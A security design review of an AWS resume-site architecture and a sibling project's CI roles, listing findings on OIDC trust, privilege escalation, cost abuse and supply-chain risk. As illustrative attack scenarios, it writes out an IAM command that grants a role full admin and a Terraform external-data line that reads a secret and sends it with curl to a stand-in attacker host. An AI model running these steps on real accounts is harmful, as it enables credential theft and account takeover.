# Security review: aws_resume architecture design (accepted ADRs 0001–0007)
Date: 2026-10-28
Reviewed: branch `aws-resume-architecture-draft`, commit `403a41b`
- `aws_resume/docs/architecture/overview.md`
- `aws_resume/docs/architecture/adr/0001` to `0007` (all Accepted)
- `aws_resume/PLAN.md`
- For cross-project risk only: `tf_pr_reviewer/bootstrap/main.tf`, `tf_pr_reviewer/bootstrap/variables.tf`,
  `tf_pr_reviewer/bootstrap/README.md`, `.github/workflows/tf_pr_reviewer-terraform.yml`,
  `tf_pr_bot/main.tf`, `tf_pr_bot/README.md`

This is the first security report for aws_resume. Findings start at SEC-001.

## Summary

**Verdict: proceed with fixes.** The architecture is sound: private S3 with OAC, no
long-lived keys, environment-pinned OIDC roles, separate plan and apply roles, code and
content pipelines that cannot touch infrastructure, provisioned DynamoDB as a write
ceiling, and no application secrets. These are the right choices and none of them needs
a redesign.

However, three of the design's own security claims do not hold once you check them
against real AWS and GitHub behaviour:

1. **"aws_resume is isolated from the sibling projects by IAM."** It isn't. The
   existing `tf_pr_reviewer` role can be assumed from any branch or PR workflow in the
   monorepo, and it can grant itself administrator access (SEC-001). Until that is
   fixed, every control in ADR-0006 can be bypassed. PLAN.md treats this as a Phase 2
   "follow-up". It has to be fixed **before** the aws_resume bootstrap runs.
2. **"The plan role is read-only, so any same-repo PR may use it."** AWS-managed
   `ReadOnlyAccess` includes `ssm:Get*` and `s3:Get*`. With it, the plan role can read
   `tf_pr_bot`'s GitHub App private key, every Terraform state file and the CloudFront
   logs bucket (SEC-002).
3. **"Stage throttling and the DynamoDB capacity cap bound the bill at about
   $26/month."** They bound Lambda and DynamoDB only. CloudFront requests and API
   Gateway requests (very likely including throttled 429s) are billed without any cap,
   and AWS Budgets reports with a delay of hours (SEC-004).

ADR-0006's permissions-boundary guard also has gaps that let the apply role escalate
past the boundary (SEC-003).

| Severity | Count | IDs |
|---|---|---|
| Critical | 1 | SEC-001 |
| High | 3 | SEC-002, SEC-003, SEC-004 |
| Medium | 3 | SEC-005, SEC-006, SEC-007 |
| Low | 3 | SEC-008, SEC-009, SEC-010 |
| Info | 1 | SEC-011 |

---

## Findings

### SEC-001 [Critical] Sibling `tf_pr_reviewer` CI role gives any branch in the monorepo a path to account admin

- **Where:** `tf_pr_reviewer/bootstrap/main.tf:89-93` (trust `StringLike sub = "<prefix>:*"`),
  `main.tf:160-185` (`iam:CreateRole`, `iam:PutRolePolicy`, `iam:PassRole` on `"*"`);
  `.github/workflows/tf_pr_reviewer-terraform.yml:37-39` (workflow-wide `id-token: write`).
  Referenced, but not fixed, in overview §4.2, ADR-0006 "Cross-project" and PLAN.md Phase 2
  (last bullet).
- **Issue:** The overview and ADR-0006 describe the problem only as "any workflow can
  *apply infrastructure*". It is worse than that. The role's `IAMForEC2Role` statement
  allows `iam:PutRolePolicy` on `Resource: "*"`, which includes **the role itself**. A
  role that can write its own inline policy is effectively an administrator. The trust
  policy accepts any `sub` from this repo: any branch, any `pull_request` run, and any
  workflow file, including one that was added in the PR itself. A `pull_request` run uses
  the workflow files from the PR's merge commit. The `environment: production` approval
  on the sibling's apply job protects nothing, because the same role can be assumed
  without that environment. aws_resume shares this account, so this one role defeats the
  aws_resume permissions boundary, its environment pinning and its state isolation. A
  role with admin access can do all of the following:
  - change the trust policy of `aws-resume-infra-apply`
  - overwrite the site bucket
  - repoint DNS
  - delete the budget
- **Attack scenario:** Someone who can push a branch opens a PR. That could be the
  owner's leaked PAT, a compromised AI-agent session with push rights, or a malicious
  dependency in any job that has `contents: write`. The PR adds
  `.github/workflows/x.yml` with `permissions: id-token: write`. That workflow calls
  `aws-actions/configure-aws-credentials` with the public role ARN (`vars.TF_PR_REVIEWER_AWS_ROLE_ARN`,
  readable from any workflow), and then runs
  `aws iam put-role-policy --role-name tf-pr-reviewer-test-github-actions --policy-name x --policy-document '{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]...}'`.
  After that the attacker has full admin. The attacker can then add their own AWS
  account to the trust policy of any role for persistence, and close the PR. No review
  or approval is involved at any point. Even supply-chain compromise alone is enough,
  without push rights. The sibling's plan job runs `actions/github-script@v7`,
  `hashicorp/setup-terraform@v3` and `aws-actions/configure-aws-credentials@v4`, all
  pinned to mutable tags, with this role's credentials in the environment. If any of
  those tags is re-pointed, as happened with `tj-actions/changed-files` in March 2025,
  the attacker gets admin.
- **Recommendation:** Fix this before any aws_resume bootstrap. It is a change in
  `tf_pr_reviewer`, so it needs the owner's decision. The PLAN.md task should move from
  the end of Phase 2 to a **blocking pre-requisite** at the start of Phase 2.
  1. Split the role the same way ADR-0006 does: a PR plan role trusting `…:pull_request`
     and an apply role trusting `…:environment:production`. Use `StringEquals`, not `StringLike`.
  2. Scope the IAM statement to the fixture's own role and instance-profile ARNs, and
     give `iam:PassRole` a `iam:PassedToService = ec2.amazonaws.com` condition. As things
     stand, `PassRole *` together with `ec2:RunInstances` would also let the role pass
     any role in the account to an EC2 instance.
  3. If the fixture is no longer needed, delete the role. Check first that the role
     still exists (IAM console > Roles > `tf-pr-reviewer-test-github-actions`). The
     workflow and the repo variable suggest that it does.
  4. Use CloudTrail Event History (free, 90 days) to check for unexpected
     `AssumeRoleWithWebIdentity` calls for this role whose `sub` was not the `production`
     environment.
- **References:** [GitHub OIDC subject claims](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect#example-subject-claims);
  [AWS IAM privilege escalation via PutRolePolicy](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_boundaries.html#access_policies_boundaries-delegate);
  [CISA alert on tj-actions/changed-files (CVE-2025-30066)](https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction).

### SEC-002 [High] `aws-resume-infra-plan` with `ReadOnlyAccess` lets any same-repo PR read secrets and state account-wide

- **Where:** ADR-0006 Option B "Cons" and Consequences ("Start from AWS-managed
  `ReadOnlyAccess` for the plan role"); overview §4.2 row `aws-resume-infra-plan`;
  ADR-0007 Consequences ("Only the two infra roles can read it").
- **Issue:** ADR-0006 accepts that "the plan role can still be assumed by any same-repo
  PR workflow … acceptable because it is read-only". Two parts of that reasoning are
  wrong:
  1. **`ReadOnlyAccess` is not harmless.** I checked the current policy document. It
     contains `ssm:Get*` (which covers `GetParameter` with `WithDecryption`), `s3:Get*`
     on `*`, `lambda:Get*` (`GetFunction` returns a presigned link to download the code)
     and `logs:Get*`. In this account that gives the plan role:
     - **`tf_pr_bot`'s GitHub App private key and webhook secret**
       (`/<function_name>/github-app-private-key`, a SecureString under the default
       `aws/ssm` key). The `aws/ssm` key policy allows any principal in the account to
       decrypt through SSM, so `ReadOnlyAccess` is enough.
     - every Terraform state object in the account: aws_resume's, `tf_pr_reviewer`'s
       and any others
     - the CloudFront log bucket and the API Gateway/Lambda log groups, which contain
       viewer IPs. Overview §4.3 classifies those as personal data.
     This also contradicts ADR-0007's claim that only the two infra roles can read state.
  2. **"Any same-repo PR" means any code, not just Terraform.** The `pull_request` sub
     is issued to every job in every workflow run triggered by any same-repo PR,
     including a workflow file that the PR itself adds. It is not tied to
     `aws_resume-infra.yml`. Even inside the real plan job, `terraform init/plan` runs
     code that the PR controls: `data "external"` programs, module sources from
     arbitrary URLs, and providers from a modified `.terraform.lock.hcl` or
     `required_providers`. All of it runs with the plan role's credentials.
  The claim that "GitHub does not give OIDC tokens to fork PRs" is correct, so outside
  contributors are not the risk. The risk is anyone, or anything, that can push a
  branch.
- **Attack scenario:** A compromised agent session or a leaked PAT pushes a branch
  touching `aws_resume/infra/` that adds
  `data "external" "x" { program = ["sh","-c","aws ssm get-parameter --with-decryption --name /tf-pr-bot/github-app-private-key | curl -d @- https://attacker"] }`.
  The PR plan job assumes the plan role and runs the program. The attacker now holds the
  GitHub App key and can act as the `tf_pr_bot` App: post "tfsec: no findings" comments
  on PRs, and read contents of every repo the App is installed on. The same run can copy
  every `.tfstate` in the account for reconnaissance.
- **Recommendation:** This needs an **ADR-0006 amendment (new ADR)** and owner decisions.
  - Do not attach `ReadOnlyAccess`, even as a starting point. Write a custom read policy
    limited to the services in the stack (`cloudfront:Get*/List*`, `s3:GetBucket*` on
    `aws-resume-*` buckets, `apigateway:GET`, `lambda:GetFunctionConfiguration`/
    `GetPolicy`/`GetAlias`/`ListVersionsByFunction` (not `GetFunction`, which returns
    the code), `dynamodb:Describe*`, `route53:Get*/List*`, `acm:Describe*/List*`,
    `iam:GetRole*/ListRole*` on `aws-resume-*`, `logs:Describe*`). Add `s3:GetObject`
    only on the state key, and Get/Put/Delete on the `.tflock` key. Add an **explicit
    Deny** for `ssm:GetParameter*`, `secretsmanager:GetSecretValue`, `kms:Decrypt`,
    `s3:GetObject` on any bucket outside aws_resume, and `logs:GetLogEvents`/
    `FilterLogEvents`/`StartQuery`. Use the sibling's refresh-permissions comments to
    iterate on the list.
  - For defence in depth in the workflow: run `terraform init` with
    `-lockfile=readonly`, and have CI fail if the PR changes `.terraform.lock.hcl` or
    adds `external`/`http` data sources or non-registry module sources unless a label is
    applied. tfsec/checkov will not catch this.
  - Owner decision: consider running PR plans with `-refresh=false`, or with no AWS
    credentials at all (`validate` + scanners only), and run the real plan in the
    `main`-only flow (see SEC-006). That removes AWS credentials from PR runs completely,
    which is the strongest option.
- **References:** [ReadOnlyAccess policy JSON](https://docs.aws.amazon.com/aws-managed-policy/latest/reference/ReadOnlyAccess.html)
  (contains `s3:Get*`, `ssm:Get*`, `lambda:Get*`, `logs:Get*`); [Terraform `external` data source](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/external).

### SEC-003 [High] The apply role's permissions-boundary guard has escape hatches

- **Where:** ADR-0006 Decision, "Privilege-escalation guard for the apply role";
  overview §4.2 row `aws-resume-infra-apply`; ADR-0002 naming convention.
- **Issue:** The ADR's intent is right ("may not modify its own role, the boundary
  policy or the other CI roles"), but the mechanism it describes cannot enforce it:
  1. **The name prefix covers the things it must protect.** The apply role may manage
     roles named `aws-resume-*`. The CI roles are `aws-resume-infra-apply`,
     `aws-resume-infra-plan`, `aws-resume-backend-deploy` and `aws-resume-frontend-deploy`,
     and the boundary is `aws-resume-boundary`. All of them match.
  2. **`iam:PermissionsBoundary` does not cover every IAM write.** That condition key is
     evaluated on `CreateRole`, `PutRolePolicy`, `AttachRolePolicy`, `DeleteRolePolicy`,
     `DetachRolePolicy`, `PutRolePermissionsBoundary` and `DeleteRolePermissionsBoundary`.
     It is **not** evaluated on `iam:UpdateAssumeRolePolicy`, `iam:CreatePolicyVersion`,
     `iam:SetDefaultPolicyVersion`, `iam:TagRole` or `iam:UpdateRole`. Terraform needs
     `UpdateAssumeRolePolicy` to manage the Lambda execution role, and `CreatePolicyVersion`
     if it manages any customer-managed policy.
  3. **The boundary's own content is not specified.** A boundary that allows `iam:*` or
     `sts:AssumeRole` does not contain anything.
  4. "Scoped by `aws-resume-*` name where the service supports it" leaves CloudFront,
     ACM and API Gateway (ID-based ARNs) open across the whole account, including any
     sibling distributions or APIs.
- **Attack scenario:** The apply job runs after the owner approves a routine-looking
  run. A malicious provider version, a re-tagged action (SEC-005) or a merged PR with a
  hidden resource could all lead to this. The code with apply credentials then:
  - (a) calls `iam:CreatePolicyVersion` on `aws-resume-boundary` with `"Action":"*"`
    and `--set-as-default`. Every boundaried role is now uncapped.
  - (b) creates `aws-resume-x` with that boundary and an admin inline policy, passes it
    to a new `aws-resume-x` Lambda, and invokes it. That is admin.
  Alternatively, it calls `iam:UpdateAssumeRolePolicy` on `aws-resume-infra-apply` to
  trust an attacker AWS account. This is silent persistence that survives fixing the
  repo.
- **Recommendation:** Implementation-phase requirements for the bootstrap Terraform.
  Record them in a short follow-up ADR, because they change how roles are named and
  pathed.
  - Give CI roles and the boundary a namespace that application roles cannot use. For
    example, use IAM path `/aws-resume-ci/` for the four CI roles and the boundary, and
    allow the apply role only `arn:aws:iam::<acct>:role/aws-resume-app/*` for creation
    and management.
  - Add an **explicit Deny** in the apply role's policy: `iam:*` on the four CI role
    ARNs, on the boundary policy ARN and on the OIDC provider ARN, plus
    `iam:DeleteRolePermissionsBoundary` on `*`, and `iam:PutRolePermissionsBoundary`
    unless the boundary equals `aws-resume-boundary`.
  - Allow `iam:UpdateAssumeRolePolicy` only on `role/aws-resume-app/*`, and don't allow
    `CreatePolicyVersion`/`SetDefaultPolicyVersion` at all. Use inline role policies for
    app roles so that no managed policies are needed.
  - Define the boundary as an allow-list of exactly what app roles need (DynamoDB on
    `table/aws-resume-*`, logs on `/aws/lambda/aws-resume-*`), with an explicit Deny on
    `iam:*`, `sts:AssumeRole`, `organizations:*` and `account:*`.
  - Where ARNs can't be name-scoped (CloudFront, ACM, API Gateway), require
    `aws:RequestTag/Project = aws-resume` on create and `aws:ResourceTag/Project = aws-resume`
    on update/delete. All three support tag-based conditions.
  - Test it: run the IAM Policy Simulator or `aws iam simulate-principal-policy` against
    each escalation call listed above, and keep the expected denials as a CI test.
- **References:** [Permissions boundaries: delegating responsibility](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_boundaries.html#access_policies_boundaries-delegate);
  [Service Authorization Reference: IAM actions and condition keys](https://docs.aws.amazon.com/service-authorization/latest/reference/list_awsidentityandaccessmanagementiam.html);
  [Rhino Security Labs, AWS IAM privilege escalation methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/) (CreatePolicyVersion, UpdateAssumeRolePolicy, PassRole+Lambda).

### SEC-004 [High] There is no cost ceiling at the edge; the "$26/month worst case" is not a bound

- **Where:** overview §7 "Abuse cost ceiling", §4.1 row CloudFront → API Gateway;
  ADR-0003 "Accepted gap"; ADR-0001 Option D and Decision (stay on pay-as-you-go);
  ADR-0007 budget.
- **Issue:** The design's ceiling covers Lambda (stage throttle) and DynamoDB (1 WCU).
  It does not cover the two services that bill per request with no cap:
  1. **API Gateway.** AWS pricing charges per API call received. I found no published
     exemption for throttled (429) requests, and AWS support answers on the topic
     conflict, so treat 429s as billed. The stage throttle stops Lambda invocations; it
     does not stop API Gateway billing. Direct `execute-api` requests at 1,000 rps cost
     about $2,600/month, not $26. The overview's figure assumes the attacker sends only
     10 rps.
  2. **CloudFront pay-as-you-go.** After the always-free 10M requests and 1 TB, HTTPS
     requests are about $0.01 per 10k and data transfer about $0.085/GB. Repeatedly
     downloading a 1–2 MB resume PDF is a cheap way to burn the 1 TB allowance and then
     bill per GB. Shield Standard does not refund layer-7 abuse costs.
  3. **AWS Budgets is not a brake.** Budget data refreshes up to three times a day and
     billing data itself lags, so a $5 alert can fire many hours into an attack. Nothing
     in the design acts on the alert.
- **Attack scenario:** Someone who dislikes the owner, or a bored scanner, points a
  small botnet at `https://<api-id>.execute-api.us-east-1.amazonaws.com/api/visits`
  (the ID is visible in TLS/CT logs and DNS history, or guessable from 403 probes) at a
  few thousand rps over a weekend. Every request is billed at $1/M. In parallel, a loop
  fetches `/resume.pdf` through CloudFront. The first email arrives the next day.
- **Recommendation:** Owner decision. Pick one of the following, and record it in a new
  ADR that supersedes the cost claim in ADR-0003 and the overview:
  - **(a) Close the direct path and cap the edge.** Switch the API to ADR-0003 Option B
    (Lambda Function URL with CloudFront OAC, `AWS_IAM` auth). Unauthenticated direct
    calls are rejected before invocation and are not billed as invocations. Set Lambda
    reserved concurrency to a small number (2–5). Then revisit ADR-0001 Option D (the
    CloudFront flat-rate Free plan has no overage charges). This turns "unbounded" into
    "degraded".
  - **(b) Keep HTTP API, but add an automatic brake.** A CloudWatch alarm on API
    Gateway `Count` and CloudFront `Requests` (for example over 50k/hour), wired through
    SNS to a small Lambda that sets the stage throttle to 0 and disables the
    distribution. Also a billing alarm (`EstimatedCharges`, us-east-1). Document a
    manual runbook ("disable distribution, delete stage").
  - **(c) Accept the risk explicitly**, with the corrected worst case written down, and
    a WAF rate-based rule as the trigger-based escalation.
  Whatever is chosen: keep large files (the PDF) small, and set `Cache-Control` long so
  that abuse is served from cache. The default behaviour should use `CachingOptimized`,
  which leaves query strings out of the cache key so `?x=random` cannot bust the cache.
- **References:** [API Gateway pricing](https://aws.amazon.com/api-gateway/pricing/);
  [HTTP API throttling](https://docs.aws.amazon.com/apigateway/latest/developerguide/http-api-throttling.html);
  [CloudFront pricing / flat-rate plans](https://aws.amazon.com/cloudfront/pricing/);
  [AWS Budgets: budget data refreshes up to three times a day](https://docs.aws.amazon.com/cost-management/latest/userguide/budgets-managing-costs.html).

### SEC-005 [Medium] The CI supply chain is not pinned; third-party code runs with deploy credentials

- **Where:** PLAN.md "CI/CD pipelines" and Phase 2–4 pipeline tasks; ADR-0002
  ("follows the existing `tf_pr_reviewer-terraform.yml` structure"); sibling workflow
  lines 57, 60, 66, 110, 154, 157, 163 (all tag-pinned).
- **Issue:** The design copies the sibling workflow, which pins every action to a
  mutable tag (`@v4`, `@v3`, `@v7`). Nothing in the ADRs requires SHA pinning, Terraform
  provider/lock-file integrity, or pinned scanner versions. In the apply, backend and
  frontend jobs, those actions run in the same process environment as the AWS
  credentials. The planned tfsec/checkov/Semgrep/gitleaks steps are also third-party
  actions or images.
- **Attack scenario:** An upstream maintainer account is compromised and the `v3` tag
  of a setup action is re-pointed to code that prints `AWS_SESSION_TOKEN` to the log in
  encoded form, as in the tj-actions incident. The repo is public, so the next approved
  apply leaks apply-role credentials to anyone reading the log. Those credentials are
  valid for up to an hour.
- **Recommendation:** Code/config change in Phase 2. Add these as acceptance criteria
  for the pipeline PLAN.md tasks.
  - Pin every `uses:` to a full commit SHA with a version comment, and let Dependabot
    (`github-actions` ecosystem) propose updates.
  - Set the top-level `permissions: {}` and grant `id-token: write` and
    `pull-requests: write` per job. ADR-0006 already intends this; the sibling grants
    them workflow-wide.
  - Commit `.terraform.lock.hcl` with hashes for linux_amd64, and use
    `terraform init -lockfile=readonly`. Pin `terraform_version` exactly.
  - Run scanners in jobs that **do not** have AWS credentials. ADR-0006 already says
    this for the backend and frontend pipelines; extend it to the infra pipeline's
    scanner steps.
  - Pass all `${{ }}` values into `run:`/`script:` through `env:`. The sibling already
    does this for plan output; keep it that way.
  - Never use `pull_request_target` or `workflow_run` in this repo (see SEC-006).
- **References:** [GitHub: security hardening for Actions, using third-party actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-third-party-actions);
  [Terraform dependency lock file](https://developer.hashicorp.com/terraform/language/files/dependency-lock).

### SEC-006 [Medium] The approval gate approves a run, not a plan, and binds the environment, not the workflow

- **Where:** ADR-0006 Decision "GitHub side" and Consequences "Infra pipeline";
  overview owner decision 10; ADR-0007 `concurrency` + `cancel-in-progress`; PLAN.md
  Phase 2 environments and branch-protection tasks.
- **Issue:** The design treats the environment approval as the main control on the
  apply role. In practice:
  1. **It's self-approval.** The owner is the only reviewer and also the author and
     merger. GitHub's "Prevent self-review" option would block the only possible
     approver, so it has to be off. The gate therefore protects against automation that
     acts without the owner (a useful property), but not against the owner's compromised
     GitHub session.
  2. **The approved thing is not the reviewed thing.** Following the sibling, the apply
     job runs `terraform apply -auto-approve`, which re-plans at apply time. The owner
     reviews a PR plan from the merge commit, then approves a run whose actual changes
     are never shown before they happen.
  3. **Any workflow on `main` can declare the environment.** The token's `sub` is
     `…:environment:aws-resume-prod-infra` for *any* job that declares that environment.
     The deployment branch rule checks the ref, not the workflow file. A future workflow
     on `main` (another project's, or one an agent wrote) that declares
     `environment: aws-resume-prod-infra` gets the apply role after one approval click.
     A `pull_request_target` workflow runs on the base ref (`main`), so it passes the
     branch rule while operating on PR content.
  4. `cancel-in-progress: true` on the apply group can kill a **running**
     `terraform apply` mid-way, leaving partial changes and a stale `.tflock`.
- **Attack scenario:** A PR that looks like a CSS change also adds
  `.github/workflows/lint.yml` with `environment: aws-resume-prod-infra` and a step that
  runs `aws iam …`. After merge, the owner sees "aws-resume-prod-infra is waiting for
  review" and approves it as routine, because the infra pipeline always asks for this.
  The approval screen does not show which workflow file requested it unless the owner
  checks.
- **Recommendation:**
  - Workflow change (Phase 2): split the push-to-main flow into a `plan` job that writes
    `tfplan` as an artifact and puts `terraform show` in the job summary, and a gated
    `apply` job that runs `terraform apply tfplan`. Then the approval is for exactly the
    plan that was displayed. The plan job needs a role. Either trust a second,
    reviewer-free environment `aws-resume-prod-infra-plan` (main-only) on the plan role,
    or add the `ref:refs/heads/main` sub to it.
  - Use `cancel-in-progress: false` for the apply job, and keep cancel-in-progress only
    for queued runs that are still waiting.
  - Add a CODEOWNERS entry for `/.github/workflows/` and a gitleaks-style CI check that
    fails if any workflow other than `aws_resume-*.yml` mentions
    `aws-resume-prod-` or `AWS_RESUME_*_ROLE_ARN`.
  - Branch protection on `main`: require PRs and status checks, enable "Do not allow
    bypassing the above settings", and block force pushes.
  - Organization/repo setting: require approval for workflows from all outside
    collaborators, and keep "Allow GitHub Actions to create and approve pull requests"
    off.
  - Verify by test during Phase 2. Open a PR whose job declares
    `environment: aws-resume-prod-infra` and confirm GitHub refuses it on the branch
    rule. Confirm that `assume-role` with the plan role fails from a job that declares
    an environment.
  - Owner decision: accept self-approval as a documented solo-developer limitation.
    It's a good interview talking point: "two-person rule is not possible solo; here's
    what compensates."
  - ADR-0006 Option C (custom sub template with `job_workflow_ref`) would close item 3
    properly. Reconsider it once SEC-001 has changed the sibling's trust anyway, because
    the cross-project cost that made it "overkill" is then already being paid.
- **References:** [GitHub: deployment protection rules, prevent self-review](https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments);
  [GitHub OIDC: customizing the subject claim](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect#customizing-the-token-claims).

### SEC-007 [Medium] No detection and response plan: CloudTrail trail, IAM change alerts and root protection are assumed but not planned

- **Where:** ADR-0006 Consequences ("CloudTrail (free management-event trail) records
  every role assumption"); overview §4.1 "MFA on the account"; PLAN.md (no task for
  either).
- **Issue:** No PLAN.md task or ADR creates a trail. Without one, you only have
  CloudTrail **Event History**: 90 days, management events, no alerts, and no copy that
  survives an attacker or a mistake. The design does not alert on the events that matter
  most here: IAM role, policy and trust changes, OIDC provider changes, budget deletion,
  root login. Root MFA and the absence of root access keys are stated, but nothing
  verifies them. Without these, SEC-001, SEC-003 and SEC-004 would all be discovered
  late, and could not be investigated after 90 days.
- **Attack scenario:** The SEC-001 escalation is used once, to add an external account
  to `aws-resume-infra-apply`'s trust. Nobody gets an alert. Months later the owner sees
  strange resources, and Event History no longer covers the original change.
- **Recommendation:** Bootstrap tasks (PLAN.md Phase 2), outside the apply role's reach:
  - One multi-region trail. The first copy of management events is free; S3 storage
    costs cents. Enable log file validation, and send it to a dedicated
    `aws-resume-cloudtrail-<acct>` bucket with a deny-delete bucket policy for everyone
    except a break-glass admin. Even better, make it account-wide and owned by no single
    project, since the account is shared.
  - EventBridge rules in us-east-1 (IAM events are delivered there) → SNS email for:
    - `CreateRole`, `UpdateAssumeRolePolicy`, `PutRolePolicy`, `AttachRolePolicy`,
      `CreatePolicyVersion`, `DeleteRolePermissionsBoundary`
    - `*OpenIDConnectProvider*`
    - `DeleteBudget`/`UpdateBudget`
    - root `ConsoleLogin`
    - `StopLogging`/`DeleteTrail`
  - Turn on IAM Access Analyzer (external access analyzer, free). It flags role trust
    policies that allow outside accounts.
  - Checklist item: root has MFA (hardware or passkey), no root access keys, and
    alternate contacts set.
  - Write a short incident runbook: revoke sessions (`AWSRevokeOlderSessions` inline
    deny), disable the environment, rotate the GitHub App key.
- **References:** [CloudTrail pricing (first management-event trail free)](https://aws.amazon.com/cloudtrail/pricing/);
  [EventBridge: IAM events are delivered to us-east-1](https://docs.aws.amazon.com/IAM/latest/UserGuide/cloudtrail-integration.html);
  [IAM Access Analyzer](https://docs.aws.amazon.com/IAM/latest/UserGuide/what-is-access-analyzer.html).

### SEC-008 [Low] State and log buckets rely on identity policies only

- **Where:** ADR-0007 Decision 1 and Consequences; overview §5 (CF logs bucket).
- **Issue:** The state bucket policy only denies non-TLS access. The statement "only the
  two infra roles can read it" is true only if no other principal in the shared account
  has `s3:Get*`. SEC-001 and SEC-002 show that other principals do. The CloudFront logs
  bucket (viewer IPs) has the same issue. Because the account is shared, a
  resource-policy deny is the control that does not depend on every other project's
  IAM being correct.
- **Attack scenario:** A future sibling project attaches `ReadOnlyAccess` or
  `AmazonS3ReadOnlyAccess` to its CI role. That role can now read aws_resume state and
  visitor IPs, and aws_resume's own design and review never see the change.
- **Recommendation:** Bootstrap Terraform (Phase 2) and frontend infra (Phase 4). Add a
  bucket-policy `Deny` on `s3:GetObject`/`PutObject`/`DeleteObject` where
  `aws:PrincipalArn` is not one of: the infra plan/apply roles, a named break-glass admin
  role, and (for the logs bucket) the `delivery.logs.amazonaws.com` service principal
  conditioned on `aws:SourceAccount` and `aws:SourceArn`. Restrict the plan role's
  object access to `GetObject` on the state key and Get/Put/Delete on
  `<key>.tflock`. ADR-0007 already says this; make sure the bucket policy enforces it
  too.
- **References:** [Terraform S3 backend: required permissions with `use_lockfile`](https://developer.hashicorp.com/terraform/language/backend/s3#permissions-required);
  [CloudFront standard logging v2 delivery permissions](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/standard-logging.html).

### SEC-009 [Low] Edge and app details the implementation must get right

- **Where:** ADR-0001 Decision; ADR-0003 Decision and Consequences; overview §4.1.
- **Issue:** The design is right at the level of the ADRs. These details decide whether
  it is secure once built, and none of them is written down yet:
  - **Default behaviour methods:** `allowed_methods = ["GET","HEAD"]` (plus `OPTIONS`
    if needed). OAC signs whatever method the viewer sends, so the S3 bucket policy must
    grant the CloudFront principal **only** `s3:GetObject`, never `s3:*` or `PutObject`.
    The `/api/*` behaviour is the only one that should allow POST.
  - **CSP:** "a custom CSP" has to mean something concrete:
    `default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; connect-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; form-action 'none'`.
    That means no inline scripts, which the vanilla-JS decision makes easy. Add
    `Permissions-Policy`. Set HSTS `max-age` ≥ 1 year with `includeSubDomains`. Don't
    `preload` until you are sure the domain stays.
  - **Same-origin API:** `/api/*` is same-origin with the site. The frontend must render
    the count with `textContent`/`Number()`, never `innerHTML`. Lambda must always
    return `Content-Type: application/json`. Otherwise a compromised backend deploy can
    serve HTML on the site's origin. The security headers policy should also apply to
    `/api/*`.
  - **Lambda resource policy:** `source_arn = "${api.execution_arn}/*/*/api/visits"` on
    the `live` alias qualifier, not `"${execution_arn}/*"`.
  - **Log contents:** API Gateway access log format should omit headers and query
    strings. Lambda must not log the event object, because it includes `X-Forwarded-For`
    and the user agent.
- **Attack scenario:** For example: a permissive bucket policy (`s3:*` for the
  CloudFront principal, a common copy-paste) combined with a default behaviour that
  allows all methods would let anyone `PUT /index.html` through CloudFront and deface
  the site.
- **Recommendation:** Add these as acceptance criteria to the Phase 3/4 PLAN.md tasks,
  and add Semgrep/checkov custom rules where cheap. No ADR needed.
- **References:** [CloudFront OAC with S3](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/private-content-restricting-access-to-s3.html);
  [MDN CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

### SEC-010 [Low] Shared-account coupling: Lambda concurrency pool and OIDC provider ownership

- **Where:** overview §4.2 (OIDC provider "looks it up with a data source"); owner
  decision 5 (same account); `tf_pr_bot/main.tf:110-163` (public Function URL, no
  reserved concurrency, 30 s timeout).
- **Issue:**
  1. All Lambdas in the account share one regional concurrency pool. `tf_pr_bot`'s
     Function URL is public (`AuthType NONE`, HMAC checked in code). A flood against it
     can exhaust the pool and throttle the aws_resume counter, and the reverse is also
     true. This only affects availability.
  2. The shared OIDC provider is now read through a data source by both projects, and
     no project's code owns it (`create_oidc_provider = false`). It isn't recorded who
     manages, monitors or would recreate it. Deleting it or changing its audience breaks
     every pipeline in the account at once.
- **Attack scenario:** An attacker sends a burst of unsigned POSTs at the bot URL. Each
  is rejected quickly, but enough concurrent ones exhaust the pool, and the visitor
  counter returns 5xx. Your alarms fire, but the resume site itself is unaffected.
- **Recommendation:** Owner decision, low priority. Give the aws_resume function a small
  reserved concurrency, which also helps SEC-004. Give `tf_pr_bot` one as well. Write a
  one-line "account-shared resources" note (OIDC provider, CloudTrail, budget) naming
  the owner of each. SEC-007's alerts cover changes to the provider.
- **References:** [Lambda concurrency](https://docs.aws.amazon.com/lambda/latest/dg/lambda-concurrency.html).

### SEC-011 [Info] Hygiene

- **Where:** overview header and §9; PLAN.md Phase 1 and Phase 2.
- **Issue / Recommendation:**
  - `overview.md` still says "Status: **Proposed**" and its ADR index lists every ADR as
    Proposed, while the ADR files are Accepted. The PLAN.md tasks "Review & approve
    architecture + ADRs" and "Create security subagent; have it critique the approved
    design" are still unchecked. Reconcile these so that future reviews know which text
    is binding.
  - gitleaks runs "on every PR" only. Also run it on push to `main` and once over full
    history, and turn on GitHub secret scanning and push protection (free for public
    repos).
  - The AWS account ID (`369634474910`) and the immutable OIDC subject are public in the
    repo. That's fine (they aren't secrets), but it means the trust-policy conditions are
    the **only** thing protecting the roles, which is why SEC-001, SEC-002 and SEC-006
    matter.
- **References:** [GitHub push protection](https://docs.github.com/en/code-security/secret-scanning/introduction/about-push-protection).

---

## What's done well

- **No long-lived credentials anywhere**, and no application secrets. Overview §4.4 is
  accurate for the aws_resume stack itself.
- **Environment-pinned `sub` with `StringEquals` and `aud` checks**, using the correct
  immutable subject format. This is the right fix for the sibling's wildcard.
  Recognising the fork-PR property (no OIDC token for fork PRs) is also correct.
- **Splitting plan and apply roles**, and limiting backend and frontend roles to one
  function or one bucket and distribution. The "code vs infrastructure" ownership
  boundary in overview §2.2 is a strong design and is easy to explain.
